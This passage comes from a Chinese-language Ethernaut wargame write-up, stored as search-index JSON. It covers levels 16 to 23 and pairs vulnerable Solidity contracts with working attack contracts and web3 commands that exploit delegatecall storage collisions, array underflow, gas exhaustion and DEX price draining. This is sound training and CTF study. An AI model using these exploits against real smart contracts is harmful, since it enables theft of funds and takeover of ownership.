_timeZone1LibraryAddress , address _timeZone2LibraryAddress ) { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg . sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; // \u4fee\u6539\u4e86\u7b2c\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf } } delegatecall \u53ea\u4f7f\u7528\u7ed9\u5b9a\u5730\u5740\u7684\u4ee3\u7801\uff0c\u5176\u4ed6\u5c5e\u6027\uff08\u5b58\u50a8\u3001\u4f59\u989d\u7b49\uff09\u90fd\u53d6\u81ea\u5f53\u524d\u5408\u7ea6\uff0c\u56e0\u6b64\uff0c\u8c03\u7528 delegatecall \u5408\u7ea6\u7684\u5b58\u50a8\u5e03\u5c40\u5fc5\u987b\u548c\u88ab\u8c03\u7528\u5408\u7ea6\u4fdd\u6301\u4e00\u81f4 \u5148\u5229\u7528 setFirstTime \u4fee\u6539\u5408\u7ea6 Preservation \u7684\u7b2c\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf\uff0c\u5373 timeZone1Library \u7684\u503c\u4e3a\u5408\u7ea6 Hack \u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 setFirstTime \u51fd\u6570\uff0c\u6b64\u65f6\u5c06\u6267\u884c\u5408\u7ea6 Hack \u4e2d\u7684\u4ee3\u7801 timeZone1Library \u5982\u679c\u4fee\u6539\u9519\u8bef\u5219\u65e0\u6cd5\u8fdb\u884c\u540e\u7eed\u6b65\u9aa4\uff0c\u6b64\u65f6\u518d\u91cd\u65b0\u7533\u8bf7\u4e00\u4e2a\u5b9e\u4f8b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Preservation { address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg . sender ; } function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } contract LibraryContract { uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } contract Hack { // Make sure the storage layout is the same as Preservation // This will allow us to correctly update the state variables address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; Preservation preservation ; constructor ( address instance ) { preservation = Preservation ( instance ); } function attack () public { // override address of timeZone1Library preservation . setFirstTime ( uint ( uint160 ( address ( this )))); // change the owner preservation . setFirstTime ( 1 ); } // function signature must match LibraryContract.setTimeSignature function setTime ( uint _time ) public { owner = tx . origin ; _time ; } } \u5e93\u5e94\u4f7f\u7528 library \u6765\u58f0\u660e library \u4e0e contract \u7c7b\u4f3c\uff0c\u4f46\u4e0d\u80fd\u58f0\u660e\u4efb\u4f55\u72b6\u6001\u53d8\u91cf\u6216\u5411\u5176\u53d1\u9001\u4ee5\u592a","title":"16. Preservation"},{"location":"wargames/ethernaut/#_12","text":"Delegatecall | Solidity by Example Library | Solidity by Example","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#17-recovery","text":"\u4ece\u9057\u5931\u7684\u5408\u7ea6\u5730\u5740\u4e2d\u627e\u56de 0.5 \u4ee5\u592a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Recovery { //generate tokens function generateToken ( string memory _name , uint256 _initialSupply ) public { new SimpleToken ( _name , msg . sender , _initialSupply ); } } contract SimpleToken { string public name ; mapping ( address => uint ) public balances ; // constructor constructor ( string memory _name , address _creator , uint256 _initialSupply ) { name = _name ; balances [ _creator ] = _initialSupply ; } // collect ether in return for tokens receive () external payable { balances [ msg . sender ] = msg . value * 10 ; } // allow transfers of tokens function transfer ( address _to , uint _amount ) public { require ( balances [ msg . sender ] >= _amount ); balances [ msg . sender ] = balances [ msg . sender ] - _amount ; balances [ _to ] = _amount ; } // clean up after ourselves function destroy ( address payable _to ) public { selfdestruct ( _to ); } } \u5df2\u77e5\u5408\u7ea6 Recovery \u7684\u5730\u5740\uff0c\u9700\u8981\u6062\u590d\u5176\u4e2d\u521b\u5efa\u7684\u5408\u7ea6 SimpleToken \u91cc\u7684\u4ee5\u592a\uff0c\u4f46\u5408\u7ea6 SimpleToken \u521b\u5efa\u540e\u6ca1\u6709\u8d4b\u503c\u7ed9\u53d8\u91cf \u4e0d\u8fc7\u4fe1\u606f\u90fd\u662f\u516c\u5f00\u7684\u561b\uff01\u4f7f\u7528\u5408\u7ea6 Recovery \u7684\u5730\u5740\u5728 Etherscan \u627e\u5230\u4ea4\u6613\u4fe1\u606f\uff0c\u5176\u4e2d\u5c31\u5305\u62ec\u5408\u7ea6\u521b\u5efa \u03a6\u03c9\u03a6 \u5408\u7ea6 SimpleToken \u5b9e\u4f8b\u7684\u5730\u5740 GET \u2714\ufe0f \u5728 Remix \u6dfb\u52a0\u5408\u7ea6 SimpleToken \u7684\u6e90\u7801\uff0c\u901a\u8fc7 At Address \u5f15\u7528\u5408\u7ea6 \u63a5\u4e0b\u6765\u8c03\u7528 destroy \u51fd\u6570\u5c31\u53ef\u4ee5\u53d6\u56de\u4ee5\u592a\u5566 XD \u5b9e\u9645\u4e0a\uff0c\u5408\u7ea6\u5730\u5740\u90fd\u662f\u786e\u5b9a\u6027\u7684\uff0c\u901a\u8fc7\u5408\u7ea6\u521b\u5efa\u8005\uff08 sender \uff09\u7684\u5730\u5740 address \u4ee5\u53ca\u7531\u521b\u5efa\u8005\u53d1\u8d77\u7684\u4ea4\u6613\u7684\u6570\u91cf nonce \u8ba1\u7b97\u83b7\u5f97 \u6839\u636e EIP 161 \uff0c\u521d\u59cb nonce \u4e3a \\(1\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 import rlp from eth_utils import keccak , to_checksum_address , to_bytes def mk_contract_address ( sender : str , nonce : int ) -> str : \"\"\" Create a contract address using eth-utils. \"\"\" sender_bytes = to_bytes ( hexstr = sender ) address_bytes = keccak ( rlp . encode ([ sender_bytes , nonce ]))[ 12 :] return to_checksum_address ( address_bytes ) mk_contract_address ( to_checksum_address ( \"0x518C2143bDd79d3bc060BC4883d92D545D3E3bb0\" ), 1 ) # 0x53D144BcF44de3DeE630b1CFEabD91AC3d3caF5a \u56e0\u6b64\uff0c\u53ef\u4ee5\u5c06\u4ee5\u592a\u5e01\u53d1\u9001\u5230\u9884\u786e\u5b9a\u7684\u5730\u5740\uff0c\u968f\u540e\u5728\u6307\u5b9a\u5730\u5740\u521b\u5efa\u5408\u7ea6\u6765\u6062\u590d\u4ee5\u592a\u5e01\uff0c\u5b9e\u73b0\u65e0\u79c1\u94a5\u4fdd\u5b58\u4ee5\u592a\u5e01","title":"17. Recovery"},{"location":"wargames/ethernaut/#_13","text":"How is the address of an Ethereum contract computed? Normal transactions VS. Internal transactions in etherscan - Ethereum Stack Exchange","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#18-magicnumber","text":"\u90e8\u7f72\u5408\u7ea6 Solver \uff0c\u5305\u542b\u51fd\u6570 whatIsTheMeaningOfLife() \uff0c\u9700\u8981\u8fd4\u56de\u6b63\u786e\u7684\u6570\uff0c\u5373 42 \u4ee3\u7801\u6700\u591a\u53ea\u80fd\u5305\u542b 10 \u4e2a\u64cd\u4f5c\u7801\uff0c\u53ef\u80fd\u9700\u8981\u4eba\u5de5\u7f16\u5199 EVM \u5b57\u8282\u7801 \ud83d\ude31 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract MagicNum { address public solver ; constructor () {} function setSolver ( address _solver ) public { solver = _solver ; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } EVM \u6267\u884c\u5b57\u8282\u7801\uff0c\u5e76\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u3001\u53c2\u6570\u540d\u7b49\u4fe1\u606f \u901a\u8fc7 ABI\uff0c\u5176\u5b83\u5408\u7ea6\u80fd\u591f\u8c03\u7528\u6307\u5b9a\u5408\u7ea6\u7684\u51fd\u6570 \u65e0\u8bba\u88ab\u8c03\u7528\u7684\u51fd\u6570\u540d\u662f\u4ec0\u4e48\u90fd\u5c06\u8fd4\u56de \\(42\\) \u7684\u5408\u7ea6 \ud83d\udc47\ud83c\udffb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 60 0a 60 0c 60 00 39 // copy code into memory 60 0a 60 00 f3 // return code 60 2a 60 00 52 // push 42 into memory 60 20 60 00 f3 // return \u7531\u5916\u90e8\u8d26\u6237\u53d1\u8d77\u6ca1\u6709 to \u5730\u5740\u7684\u8f6c\u8d26\u4ea4\u6613\uff0c\u5e76\u5c06\u5408\u7ea6\u7684 bytecode \u653e\u5728 data \u57df\u5373\u53ef\u521b\u5efa\u5408\u7ea6 1 2 3 >> let bytecode = \"600a600c600039600a6000f3602a60005260206000f3\" ; >> await web3 . eth . sendTransaction ({ \"data\" : bytecode , \"from\" : player }) Object { blockHash : \"0x91be4e10a259695dc64e5feea7b875135dfc3f96f1b649554761514f4282c815\" , blockNumber : 8034615 , contractAddress : \"0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736\" , ... } \u63a5\u4e0b\u6765\u8c03\u7528\u5b9e\u4f8b\u7684 setSolver \u5c31\u597d\u5566 =v= 1 2 3 >> await contract . setSolver ( \"0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736\" ); >> await contract . solver (); \"0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736\"","title":"18. MagicNumber"},{"location":"wargames/ethernaut/#_14","text":"Ethereum Virtual Machine Opcodes EVM bytecode programming - HackMD evm - What is an ABI and why is it needed to interact with contracts? - Ethereum Stack Exchange","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#19-alien-codex","text":"\u58f0\u660e\u5bf9\u5408\u7ea6\u5b9e\u4f8b\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: MIT pragma solidity ^ 0.5.0 ; import '../helpers/Ownable-05.sol' ; contract AlienCodex is Ownable { bool public contact ; bytes32 [] public codex ; modifier contacted () { assert ( contact ); _ ; } function make_contact () public { contact = true ; } function record ( bytes32 _content ) contacted public { codex . push ( _content ); } function retract () contacted public { codex . length -- ; } function revise ( uint i , bytes32 _content ) contacted public { codex [ i ] = _content ; } } \u5408\u7ea6\u7ee7\u627f\u4e2d\uff0c\u7236\u5408\u7ea6 Ownable \u7684\u4ee3\u7801\u5c06\u5168\u90e8\u62f7\u8d1d\u81f3\u5b50\u5408\u7ea6 AlienCodex \uff0c\u5305\u62ec\u53d8\u91cf owner \u6839\u636e\u63d0\u793a Understanding how array storage works \uff0c\u663e\u7136\u91cd\u70b9\u5728\u6570\u7ec4 codex \u4e0a \u52a8\u6001\u6570\u7ec4\u4e0e\u9759\u6001\u53d8\u91cf\u7684\u5b58\u50a8\u65b9\u5f0f\uff08\u53ef\u53c2\u8003 Privacy \uff09\u4e0d\u540c\uff0c\u4f46\u4ecd\u6839\u636e\u9759\u6001\u53d8\u91cf\u7684\u5b58\u50a8\u89c4\u5219\u5360\u7528\u4e00\u4e2a slot p \uff0c\u7528\u4e8e\u5b58\u50a8\u6570\u7ec4\u957f\u5ea6\uff0c\u6570\u7ec4\u504f\u79fb\u91cf\u4e3a keccak(p) \uff0c\u6570\u7ec4\u5143\u7d20\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0e\u9759\u6001\u6570\u7ec4\u76f8\u540c \u6570\u7ec4\u5143\u7d20\u504f\u79fb\u91cf\u4e3a keccak(p) + (index * elementSize) codex \u5360\u7528 slot 1 \uff0c\u8ba1\u7b97\u6570\u7ec4\u504f\u79fb\u91cf 1 2 >> web3 . utils . soliditySha3 ({ type : \"uint\" , value : 1 }) \"0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\" \u5730\u5740\u957f\u5ea6\u4e3a 32 \u5b57\u8282\uff0c\u6240\u4ee5\u603b\u5171\u6709 \\(2^{256}\\) \u4e2a slot\uff0c\u90a3\u4e48\uff0c\u60f3\u8981\u4fee\u6539 slot 0 \u7684 owner \uff0c\u9700\u8981\u4fee\u6539\u4e0b\u6807\u4e3a 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a \u7684\u6570\u7ec4\u5143\u7d20 \u64cd\u4f5c\u6570\u7ec4 codex \u9700\u8981 contact \u4e3a true 1 2 3 4 5 6 7 8 >> await web3 . eth . getStorageAt ( instance , 0 ) \"0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272\" >> await contract . make_contact () >> await contract . contact () true >> await web3 . eth . getStorageAt ( instance , 0 ) \"0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272\" // slot 0 \u5b58\u50a8\u4e86\u53d8\u91cf owner \u548c contact \u7684\u503c \u4f7f\u7528 retract \u4f7f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u51fa\uff0c\u4ece\u800c\u80fd\u4fee\u6539\u76ee\u6807\u4e0b\u6807\u7684\u5143\u7d20 1 2 3 >> await contract . retract (); >> await web3 . eth . getStorageAt ( instance , 1 ); \"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\" \u4fee\u6539 owner 1 2 3 4 5 >> await contract . revise ( \"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\" , \"0x0000000000000000000000017Fb8134848aDe56fF213eC49edBbB1D830853289\" ); >> await web3 . eth . getStorageAt ( instance , 0 ); \"0x0000000000000000000000017fb8134848ade56ff213ec49edbbb1d830853289\" >> await contract . owner (); \"0x7Fb8134848aDe56fF213eC49edBbB1D830853289\"","title":"19. Alien Codex"},{"location":"wargames/ethernaut/#_15","text":"Inheritance Layout of State Variables in Storage Accessing Private Data | Solidity by Example","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#20-denial","text":"\u963b\u6b62 owner \u5728\u6295\u8d44\u4eba\u8c03\u7528 withdraw() \u65f6\u83b7\u5229 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Denial { address public partner ; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address ( 0xA9E ); uint timeLastWithdrawn ; mapping ( address => uint ) withdrawPartnerBalances ; // keep track of partners balances function setWithdrawPartner ( address _partner ) public { partner = _partner ; } // withdraw 1% to recipient and 1% to owner function withdraw () public { uint amountToSend = address ( this ). balance / 100 ; // perform a call without checking return // The recipient can revert, the owner will still get their share partner . call { value : amountToSend }( \"\" ); payable ( owner ). transfer ( amountToSend ); // keep track of last withdrawal time timeLastWithdrawn = block . timestamp ; withdrawPartnerBalances [ partner ] += amountToSend ; } // allow deposit of funds receive () external payable {} // convenience function function contractBalance () public view returns ( uint ) { return address ( this ). balance ; } } withdraw() \u5e76\u6ca1\u6709\u68c0\u67e5 partner.call{value:amountToSend}(\"\"); \u7684\u8fd4\u56de\u503c\uff0c\u56e0\u6b64\u88ab\u8c03\u7528\u51fd\u6570 revert \u5e76\u4e0d\u4f1a\u5f71\u54cd\u540e\u7eed\u8bed\u53e5\u7684\u6267\u884c\uff0c\u4f46\u53ef\u4ee5\u8017\u5c3d\u6c7d\u6cb9\u4f7f\u6574\u4e2a\u4ea4\u6613\u5931\u8d25 1 2 3 4 5 6 // \u5148\u4f7f\u7528 setWithdrawPartner \u8bbe\u7f6e partner \u4e3a\u5408\u7ea6 Hack \u7684\u5730\u5740 contract Hack { receive () external payable { while ( true ) {} } } \u5f53\u4f7f\u7528 call \u53d1\u8d77\u5916\u90e8\u8c03\u7528\u65f6\uff0c\u6700\u597d\u6307\u5b9a\u6c7d\u6cb9\u91cf\uff0c\u5982 call.gas(100000).value() \u5916\u90e8 CALL \u6700\u591a\u53ef\u4ee5\u4f7f\u7528 CALL \u65f6 63/64 \u7684\u6c7d\u6cb9\uff0c\u56e0\u6b64\uff0c\u8db3\u591f\u9ad8\u7684\u6c7d\u6cb9\u91cf\u4e5f\u53ef\u4ee5\u7f13\u89e3\u8fd9\u79cd\u653b\u51fb","title":"20. Denial"},{"location":"wargames/ethernaut/#21-shop","text":"\u4ee5\u4f4e\u4e8e\u5b9a\u4ef7\u7684\u4ef7\u683c\u4ece\u5546\u5e97\u8d2d\u4e70\u5546\u54c1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Buyer { function price () external view returns ( uint ); } contract Shop { uint public price = 100 ; bool public isSold ; function buy () public { Buyer _buyer = Buyer ( msg . sender ); if ( _buyer . price () >= price && ! isSold ) { isSold = true ; price = _buyer . price (); } } } \u9700\u8981\u5b9e\u73b0 price() \u51fd\u6570\uff0c\u4f7f\u5f97\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\u8fd4\u56de\u7684\u4ef7\u683c\u4e0d\u5c0f\u4e8e\u5b9a\u4ef7\uff0c\u7b2c\u4e8c\u6b21\u8c03\u7528\u65f6\u8fd4\u56de\u7684\u4ef7\u683c\u5c0f\u4e8e\u5b9a\u4ef7 \u58f0\u660e\u4e86 view \u7684\u51fd\u6570\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\uff0c\u7b2c\u4e00\u53cd\u5e94\u662f\u5229\u7528 gasleft() \u6765\u83b7\u5f97\u53d8\u5316\u7684\u503c 1 2 3 4 5 6 7 8 contract Hack { function buy ( address instance ) public { Shop ( instance ). buy (); } function price () external view returns ( uint ) { return gasleft () / 10 - 300 ; // \u5728 Goerli \u6d4b\u8bd5\u7f51\u7edc\u4e0a\u8c03\u8bd5\u901a\u8fc7 } } \u58f0\u660e\u4e86 view \u7684\u51fd\u6570\u53ef\u4ee5\u8bfb\u53d6\u72b6\u6001\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5229\u7528\u72b6\u6001\u53d8\u91cf isSold 1 2 3 4 5 6 7 8 contract Hack { function buy ( address instance ) public { Shop ( instance ). buy (); } function price () external view returns ( uint ) { return Shop ( msg . sender ). isSold () ? 0 : 100 ; } }","title":"21. Shop"},{"location":"wargames/ethernaut/#22-dex","text":"\u81f3\u5c11\u6e05\u7a7a DEX \u5408\u7ea6\u4e2d\u7684\u4e00\u79cd\u4ee3\u5e01 \u5408\u7ea6 Dex \u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 100 \u679a\uff0c\u73a9\u5bb6\u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 10 \u679a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\" ; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\" ; import 'openzeppelin-contracts-08/access/Ownable.sol' ; contract Dex is Ownable { address public token1 ; address public token2 ; constructor () {} function setTokens ( address _token1 , address _token2 ) public onlyOwner { token1 = _token1 ; token2 = _token2 ; } function addLiquidity ( address token_address , uint amount ) public onlyOwner { IERC20 ( token_address ). transferFrom ( msg . sender , address ( this ), amount ); } function swap ( address from , address to , uint amount ) public { require (( from == token1 && to == token2 ) || ( from == token2 && to == token1 ), \"Invalid tokens\" ); require ( IERC20 ( from ). balanceOf ( msg . sender ) >= amount , \"Not enough to swap\" ); uint swapAmount = getSwapPrice ( from , to , amount ); IERC20 ( from ). transferFrom ( msg . sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swapAmount ); IERC20 ( to ). transferFrom ( address ( this ), msg . sender , swapAmount ); } function getSwapPrice ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableToken ( token1 ). approve ( msg . sender , spender , amount ); SwappableToken ( token2 ). approve ( msg . sender , spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableToken is ERC20 { address private _dex ; constructor ( address dexInstance , string memory name , string memory symbol , uint256 initialSupply ) ERC20 ( name , symbol ) { _mint ( msg . sender , initialSupply ); _dex = dexInstance ; } function approve ( address owner , address spender , uint256 amount ) public { require ( owner != _dex , \"InvalidApprover\" ); super . _approve ( owner , spender , amount ); } } \u68b3\u7406\u5408\u7ea6 Dex \u63d0\u4f9b\u7684\u4ee3\u5e01\u4e92\u6362\u65b9\u5f0f \u6839\u636e\u8981\u4ea4\u6362\u7684 from \u4ee3\u5e01\u7684\u6570\u91cf amount \u3001 Dex \u5408\u7ea6 from \u548c to \u4ee3\u5e01\u7684\u4f59\u989d\u8ba1\u7b97\u4ea4\u6362\u5f97\u5230 to \u4ee3\u5e01\u7684\u6570\u91cf swapAmount \uff0c\u5373 swapAmount = amount * to.balance / from.balance \u5c06\u8981\u4ea4\u6362\u7684 from \u4ee3\u5e01\u5b58\u5165 Dex \u5408\u7ea6\uff0c swapAmount \u6570\u91cf\u7684 to \u4ee3\u5e01\u4ece Dex \u5408\u7ea6\u8f6c\u51fa \u82e5\u9996\u5148\u5c06 10 \u679a token1 \u8f6c\u6362\u4e3a token2 \uff0c\u6b64\u65f6 swapAmount \u4e3a 10\uff0c Dex \u5408\u7ea6 token1 \u7684\u4f59\u989d\u53d8\u4e3a 110\u3001 token2 \u7684\u4f59\u989d\u53d8\u4e3a 90\uff0c\u73a9\u5bb6\u5c06\u6301\u6709 20 \u679a token2 \u4ee3\u5e01\uff0c\u518d\u5c06\u5168\u90e8 token2 \u8f6c\u4e3a token1 \uff0c\u6b64\u65f6 swapAmount \u63d0\u9ad8\u5230 24\uff0c\u53ef\u89c1\u4e0d\u65ad\u8fdb\u884c\u4ee3\u5e01\u4e92\u6362\u5373\u53ef\u6e05\u7a7a Dex \u5408\u7ea6\u4e2d\u7684\u4e00\u79cd\u4ee3\u5e01 \u90e8\u7f72\u5408\u7ea6 Hack \uff0c\u5e76\u6388\u6743\u4f7f\u7528\u4ee3\u5e01 >> contract.approve(\"<hack-address>\", 10) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 contract Hack { function exploit ( address instance ) public { Dex dex = Dex ( instance ); address token1 = dex . token1 (); address token2 = dex . token2 (); IERC20 ( token1 ). transferFrom ( msg . sender , address ( this ), 10 ); IERC20 ( token2 ). transferFrom ( msg . sender , address ( this ), 10 ); while ( dex . balanceOf ( token1 , instance ) > 0 && dex . balanceOf ( token2 , instance ) > 0 ) { uint256 amount = dex . balanceOf ( token1 , address ( this )); // \u5c06\u6301\u6709\u7684\u4ee3\u5e01\u5168\u90e8\u7528\u4e8e\u4ea4\u6362 if ( amount > 0 ) { // \u9664\u7b2c\u4e00\u6b21\u4ea4\u6362\u5916\uff0c\u5408\u7ea6 Dex \u7684 to \u4ee3\u5e01\u7684\u4f59\u989d\u5fc5\u4e3a 110 // \u5f53 swapAmount \u5927\u4e8e Dex \u5408\u7ea6 to \u4ee3\u5e01\u7684\u4f59\u989d\u65f6\uff0c\u8bf4\u660e\u672c\u6b21\u4ea4\u6362\u80fd\u591f\u6e05\u7a7a to \u4ee3\u5e01 // \u5373\u53ef\u4ee5\u83b7\u5f97 110 \u679a to \u4ee3\u5e01\uff0c\u90a3\u4e48\u53c2\u4e0e\u4ea4\u6362\u7684 from \u4ee3\u5e01\u7684\u6570\u91cf\u5e94\u4e3a // 110 * from.balance / to.balance = 110 * from.balance / 110 = from.balance if ( dex . getSwapPrice ( token1 , token2 , amount ) > dex . balanceOf ( token2 , instance )) { amount = dex . balanceOf ( token1 , instance ); } dex . approve ( instance , amount ); dex . swap ( token1 , token2 , amount ); } else { amount = dex . balanceOf ( token2 , address ( this )); if ( dex . getSwapPrice ( token2 , token1 , amount ) > dex . balanceOf ( token1 , instance )) { amount = dex . balanceOf ( token2 , instance ); } dex . approve ( instance , amount ); dex . swap ( token2 , token1 , amount ); } } } } \u4e0d\u5e94\u4ece\u5355\u4e2a\u6765\u6e90\u83b7\u53d6\u4ef7\u683c\u6216\u5176\u5b83\u6570\u636e\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8e Oracles\uff0c\u5982 Chainlink Data Feeds","title":"22. Dex"},{"location":"wargames/ethernaut/#23-dex-two","text":"\u6e05\u7a7a DexTwo \u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4ee3\u5e01 \u5408\u7ea6 DexTwo \u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 100 \u679a\uff0c\u73a9\u5bb6\u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 10 \u679a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\" ; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\" ; import 'openzeppelin-contracts-08/access/Ownable.sol' ; contract DexTwo is Ownable { address public token1 ; address public token2 ; constructor () {} function setTokens ( address _token1 , address _token2 ) public onlyOwner { token1 = _token1 ; token2 = _token2 ; } function add_liquidity ( address token_address , uint amount ) public onlyOwner { IERC20 ( token_address ). transferFrom ( msg . sender , address ( this ), amount ); } function swap ( address from , address to , uint amount ) public { require ( IERC20 ( from ). balanceOf ( msg . sender ) >= amount , \"Not enough to swap\" ); uint swapAmount = getSwapAmount ( from , to , amount ); IERC20 ( from ). transferFrom ( msg . sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swapAmount ); IERC20 ( to ). transferFrom ( address ( this ), msg . sender , swapAmount ); } function getSwapAmount ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableTokenTwo ( token1 ). approve ( msg . sender , spender , amount ); SwappableTokenTwo ( token2 ). approve ( msg . sender , spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableTokenTwo is ERC20 { address private _dex ; constructor ( address dexInstance , string memory name , string memory symbol , uint initialSupply ) ERC20 ( name , symbol ) { _mint ( msg . sender , initialSupply ); _dex = dexInstance ; } function approve ( address owner , address spender , uint256 amount ) public { require ( owner != _dex , \"InvalidApprover\" ); super . _approve ( owner , spender , amount ); } } \u76f8\u6bd4\u5408\u7ea6 Dex \uff0c\u5408\u7ea6 DexTwo \u5728\u8fdb\u884c\u8d27\u5e01\u4ea4\u6362\u65f6\u4e0d\u518d\u68c0\u67e5\u8f93\u5165\u53c2\u6570 from \u3001 to \uff0c\u56e0\u6b64\u53ef\u4ee5\u501f\u52a9\u5176\u5b83\u4ee3\u5e01\u6765\u6e05\u7a7a DexTwo \u4e2d\u7684 token1 \u548c token2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 contract Hack { address [] tokens ; function exploit ( address instance ) public { DexTwo dex = DexTwo ( instance ); tokens . push ( dex . token1 ()); tokens . push ( dex . token2 ()); for ( uint8 i = 0 ; i < 2 ; i ++ ) { SwappableTokenTwo token = new SwappableTokenTwo ( instance , \"fake\" , \"F\" , 2 ); token . transfer ( instance , 1 ); token . approve ( address ( this ), instance , 1 ); dex . swap ( address ( token ), tokens [ i ], 1 ); } } } \u58f0\u660e\u5b9e\u73b0\u4e86 ERC20 